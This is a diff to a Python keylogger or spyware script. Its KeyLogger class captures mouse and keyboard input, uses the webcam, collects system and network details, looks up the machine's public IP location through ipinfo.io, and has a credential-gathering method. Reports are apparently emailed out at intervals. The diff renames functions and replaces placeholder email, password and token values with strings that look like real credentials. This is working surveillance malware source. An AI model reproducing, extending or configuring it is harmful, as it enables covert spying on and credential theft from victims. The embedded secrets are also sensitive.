@@ -22,9 +22,9 @@ try:
     from pynput import mouse
     from pynput import keyboard
     from pydub import AudioSegment
-    from email.mime.multipart import MIMEMultipart
     from email.mime.base import MIMEBase
     from email.mime.text import MIMEText
+    from email.mime.multipart import MIMEMultipart
     from email import encoders
 
 except ModuleNotFoundError:
@@ -64,9 +64,9 @@ finally:
 
     atexit.register(cleanup_temp_dir)
 
-    EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS_HERE"
-    EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD_HERE"
-    IP_INFO_TOKEN = "YOUR_IPINFO_TOKEN_HERE"
+    EMAIL_ADDRESS = "a36f2db379fade"
+    EMAIL_PASSWORD = "e79b8e24d4c8c9"
+    IP_INFO_TOKEN = "052c054ec65ee7"
     SEND_REPORT_EVERY = 10
 
     class KeyLogger:
@@ -230,9 +230,10 @@ finally:
                 cv2.destroyAllWindows()
                 cap.release()
 
-        def get_systeminfo(self):
+        def get_os_info(self):
             systeminfo_output_bytes = subprocess.check_output(["systeminfo"])
             systeminfo_output = systeminfo_output_bytes.decode("utf-8", errors = "replace")
+            self.appendlog("OS Info:\n\n")
             self.appendlog(systeminfo_output)
 
         def system_information(self):
@@ -258,7 +259,7 @@ finally:
                     formatted_output += "\n" + "   " + "   " * indent + f"{key}: {value}"
             return formatted_output
 
-        def get_own_ip_info(self, token):
+        def get_public_ip_info(self, token):
             url = "https://ipinfo.io/json"
             headers = {
                 "Authorization": f"Bearer {token}"
@@ -275,7 +276,7 @@ finally:
             ordered_data = {key: data[key] for key in ordered_keys if key in data}
 
             formatted_info = self.formatted_data(ordered_data)
-            self.appendlog("Internet Protocol Info:")
+            self.appendlog("Public IP Info:")
             self.appendlog(formatted_info)
 
         def get_credentials(self):
@@ -451,9 +452,9 @@ finally:
             self.appendlog('\n')
             self.get_ip_config()
             self.appendlog('\n')
-            self.get_own_ip_info(IP_INFO_TOKEN)
+            self.get_public_ip_info(IP_INFO_TOKEN)
             self.appendlog('\n')
-            self.get_systeminfo()
+            self.get_os_info()
             local_users_thread.start()
             self.appendlog('\n\n')
 
